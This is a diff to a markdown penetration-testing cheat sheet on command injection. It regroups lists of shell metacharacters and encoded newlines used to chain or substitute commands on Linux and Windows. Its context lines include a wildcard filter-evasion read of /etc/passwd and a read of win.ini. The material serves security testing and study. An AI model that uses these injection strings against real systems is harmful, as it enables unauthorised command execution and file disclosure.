@@ -2,6 +2,90 @@
 
 Search Tag(s): #helpers #command-injection
 
+## Symbols
+
+### Redirection
+
+```
+<
+>>
+>
+```
+
+### Pipe
+
+```
+|
+a|
+a)|
+```
+
+### Chain Commands
+
+- Linux
+
+```
+;
+$;
+a;
+a);
+```
+
+- Windows
+
+```
+&
+```
+
+### Logical
+
+```
+&&
+||
+```
+
+### Command substitution
+
+- Linux
+
+```
+#
+'
+"
+!
+`<command>`
+$(<command>)
+$(`<command>`)
+${<command>}
+```
+
+### New line feed
+
+- Linux
+
+```
+\n
+0x0A
+0x0a
+%0A
+%0a
+```
+
+- Windows
+
+```
+\r
+0x0D
+0x0d
+%0D
+%0d
+\r\n
+0x0A0x0D
+0x0a0x0d
+%0A%0D
+%0a%0d
+```
+
 ## Enumeration Command Injection
 
 ### General
@@ -35,41 +119,11 @@ while IFS=: read -r username password userid groupid comment homedir cmdshell;do
 type C:\windows\win.ini
 ```
 
-## Chaining Commands
-
-```
-;
-$;
-a;
-a);
-&&
-&
-||
-|
-a|
-a)|
-#
-'
-"
-!
-`<command>`
-$(<command>)
-$(`<command>`)
-${<command>}
-\n
-0x0A
-0x0a
-%0A
-%0a
-\r
-\r\n
-```
-
 ## I/O Redirection
 
 ### Input
 
-#### Linux
+- Linux
 
 ```
 cat < /path/to/file.txt
@@ -78,7 +132,7 @@ strings < /path/to/file.txt
 
 ### Output
 
-#### Linux
+- Linux
 
 ```
 ls > /path/to/file.txt
@@ -89,7 +143,7 @@ $(ls) >> /path/to/file.txt
 
 ## Filter Evasion
 
-### Linux
+- Linux
 
 ```
 /bin/cat /e??/p??s??
